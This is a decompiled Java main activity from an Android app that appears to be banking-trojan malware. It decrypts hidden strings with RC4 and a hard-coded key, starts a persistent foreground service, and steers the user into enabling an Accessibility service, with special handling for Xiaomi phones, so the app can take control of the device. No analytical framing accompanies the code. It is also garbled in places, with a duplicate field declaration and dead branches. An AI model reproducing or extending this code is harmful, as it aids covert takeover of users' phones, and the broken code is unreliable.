package com.example.mmm;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Point;
import android.os.Build;
import android.os.Bundle;
import android.os.Build.VERSION;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actToaskAccessibility;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvAntiSleep;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;

public class mainActivity extends Activity {
   utils utl = new utils();
   utils2 seven$ = new utils2();
   constants utl = new constants();
   private String TAG_LOG;

   public mainActivity() {
      StringBuilder var1 = new StringBuilder();
      var1.append(mainActivity.class.getSimpleName());
      var1.append("    ");
      this.TAG_LOG = var1.toString();
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onCreate(Bundle var1) {
      super.onCreate(var1);
      Point var5 = new Point();
      this.getWindowManager().getDefaultDisplay().getSize(var5);
      utils var2 = this.utl;
      String var3 = "SW";
      StringBuilder var4 = new StringBuilder();
      var4.append(var5.x);
      var2.SettingsWrite(this, var3, var4.toString());
      var2 = this.utl;
      var3 = "SE";
      var4 = new StringBuilder();
      var4.append(var5.y);
      var2.SettingsWrite(this, var3, var4.toString());
      if (this.utl.SettingsRead(this, "QW").contains("good")) {
         this.utl.Log(this.TAG_LOG, "Initialization Start 2!");
      }

      utils.startCustomTimer(this, "", 10000L);
      this.utl._currency(this);
      if (this.utl.meters$ && !this.utl.SettingsRead(this, "EL").equals("start")) {
         Intent var6 = new Intent(this, srvAntiSleep.class);
         var6.setAction("start");
         if (VERSION.SDK_INT >= 26) {
            this.utl.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
            this.startForegroundService(var6);
         } else {
            this.utl.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
            this.startService(var6);
         }
      }

      if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
         if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
            this.seven$._cornell(this);
            if (this.utl.SettingsRead(this, "XB").equals("1")) {
               if (!"".isEmpty()) {
                  this.startActivity((new Intent(this, actToaskAccessibility.class)).addFlags(268435456).addFlags(8388608));
                  return;
               }

               this.finish();
               return;
            }
         } else {
            if (this.utl.regional$) {
               this.startActivity(new Intent(this, actToaskAccessibility.class));
               return;
            }

            this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
         }

      } else if (!"".isEmpty()) {
         this.startActivity((new Intent(this, actToaskAccessibility.class)).addFlags(268435456).addFlags(8388608));
      } else {
         this.finish();
      }
   }

   public void onPause() {
      super.onPause();
   }

   public void onStop() {
      super.onStop();
   }
}
